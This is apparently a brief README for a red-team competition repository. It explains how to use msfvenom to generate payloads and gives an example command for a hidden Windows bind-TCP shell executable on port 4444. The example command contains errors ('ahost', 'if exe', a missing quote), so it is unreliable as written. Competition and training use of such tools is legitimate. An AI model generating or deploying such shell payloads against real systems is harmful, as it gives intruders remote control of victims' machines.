# 473-redteam-tool
msfvenom is the tool I am using for the redteam competiton and currently included in this repo are a few basic scripts I've generated with it.

msfvenom git repo: https://github.com/rapid7/metasploit-framework

How to Use msfvenom
1. Search for a type of payload you want to generate
2. Generate a payload, using the command "msfvenom -p PAYLOAD_NAME -f FORMAT"

Example Scenario
1. Search for a bind_tcp payload. Select windows/shell_hidden_bind_tcp
2. Generate the payload, using the command "msfvenom -p windows/shell_hidden_bind_tcp ahost=HOST_IP lport=4444 if exe | tee hiddentcp.exe
